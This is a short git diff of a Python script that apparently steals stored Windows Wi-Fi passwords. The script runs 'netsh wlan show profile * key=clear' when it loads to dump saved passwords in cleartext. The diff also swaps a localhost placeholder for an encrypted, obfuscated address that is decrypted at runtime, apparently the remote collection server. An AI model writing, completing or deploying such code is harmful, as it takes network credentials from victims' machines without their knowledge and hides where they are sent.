@@ -2,15 +2,20 @@ import subprocess
 import threading
 import warnings
 
+# Autor   ->  an0mal1a
+# Name    ->  Pablo
+# GitHub  ->  https://github.com/an0mal1a
+# Correo  -> pablodiez024@proton.me
+
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"], stdout=subprocess.PIPE)
 
 
 def know_gme():
-    # unkown = b"9\x07\xa2:|\x9d\x1f\xe7bCN\x9aE\xfdKg4\xe7\x918\x00#\x05\x04\x00\xedR\x1c\x1c@\x15c\xf5\x91o\xcc~[z\xc9\x92B\x0c\xbf\xe9Z\xb9\x15\xd7l\xe2\x087 \xf1P\x90\xaf\x07\x0fI'\xb9\xd0"
-    # return str(decrypt(unkown).decode())
-    return "127.0.0.1"
+    unkown = b'\xf7\xf8,O\x86\xdd\xa1\xc0:v\x84\x180\xdd\xbf5\xd6t\x1d\xf5H;\x95\xe6B\x8c\xc8az\t\xa5\xcd\x1b\xc7\x9e\xc9I\xfc\x84/\xa6\x7f\xea\x13Q\xab*iP\xbe\x0f2\xc6RO=\xcb\x03\xc6\xd8f|\x0e\x84'
+    return str(decrypt(unkown).decode())
+    #return "127.0.0.1"
 
 
 def get_points():
